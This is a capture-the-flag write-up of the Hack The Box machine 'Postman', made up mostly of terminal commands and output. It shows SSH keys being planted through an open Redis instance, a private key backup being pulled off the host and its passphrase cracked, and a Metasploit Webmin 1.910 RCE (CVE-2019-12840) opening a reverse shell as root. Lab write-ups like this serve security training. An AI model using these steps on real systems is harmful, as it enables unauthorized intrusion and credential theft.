# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [Postman](https://app.hackthebox.com/machines/Postman) |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥️ **OS**        | Linux                                                  |
| 🎯 **Difficulty** | Easy                                                   |

# Scan
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.910
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Gain foothold with unsecured Redis instance by saving stored `id_rsa.pub` key to `authorized_keys` file](#gain-foothold-with-unsecured-redis-instance-by-saving-stored-id_rsapub-key-to-authorized_keys-file)
2. [Escalate to `root` user using (authenticated) RCE in Webmin 1.910 (CVE-2019-12840)](#escalate-to-root-user-using-authenticated-rce-in-webmin-1910-cve-2019-12840)

### Gain foothold with unsecured Redis instance by saving stored `id_rsa.pub` key to `authorized_keys` file

#### Generate RSA key pair
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ ssh-keygen -t rsa -b 4096 -f id_rsa
Generating public/private rsa key pair.
Enter passphrase for "id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:XbB9lS2j3GTjYLfraUCQDeTt8Eq5ZRWEfMrgB7UpadU magicrc@perun
The key's randomart image is:
+---[RSA 4096]----+
|         .+*o+o +|
|         .=B*oE+.|
|         .BB*@o= |
|         o.BBo+  |
|        S +o=  . |
|         . =. .  |
|          o  o . |
|              +  |
|             .   |
+----[SHA256]-----+
```

#### Add padding to `id_rsa.pub`
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > id_rsa.pub.pad
```

#### Store `id_rsa.pub`
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ redis-cli -h $TARGET flushall && \
cat id_rsa.pub.pad | redis-cli -h $TARGET -x set rsa_pub
OK
OK
```

#### Save stored `id_rsa.pub` to `/var/lib/redis/.ssh/authorized_keys`
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ redis-cli -h $TARGET              
10.129.2.1:6379> config get dir
1) "dir"
2) "/var/lib/redis"
10.129.2.1:6379> config set dir /var/lib/redis/.ssh
OK
10.129.2.1:6379> config set dbfilename "authorized_keys"
OK
10.129.2.1:6379> save
OK
10.129.2.1:6379>
```

#### Confirm foothold
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ ssh redis@$TARGET -i id_rsa
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

### Escalate to `root` user using (authenticated) RCE in Webmin 1.910 ([CVE-2019-12840](https://nvd.nist.gov/vuln/detail/cve-2019-12840))

#### Exfiltrate backup of encrypted private RSA key 
Key file found with `linPEAS`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ scp -i id_rsa redis@$TARGET:/opt/id_rsa.bak .
```

#### Break encryption with John the Ripper
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ ssh2john id_rsa.bak  > id_rsa.bak.hash && \
john id_rsa.bak.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)     
1g 0:00:00:00 DONE (2025-05-08 17:36) 2.941g/s 725929p/s 725929c/s 725929C/s confused6..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### Use discovered credentials for remote command execution with `root` privileges
```
┌──(magicrc㉿perun)-[~/attack/HTB Postman]
└─$ msfconsole -q -x "use linux/http/webmin_packageup_rce; set PASSWORD computer2008; set RHOSTS $TARGET; set SSL true; set USERNAME Matt; set LHOST tun0; set LPORT 4444; run"
[*] Using configured payload cmd/unix/reverse_perl
PASSWORD => computer2008
RHOSTS => 10.129.2.1
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
USERNAME => Matt
LHOST => tun0
LPORT => 4444
[*] Started reverse TCP handler on 10.10.14.161:4444 
[+] Session cookie: b3d26abab46b4d4c54f8a10b002b0639
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.161:4444 -> 10.129.2.1:53572) at 2025-05-08 18:06:06 +0200

id
uid=0(root) gid=0(root) groups=0(root)
```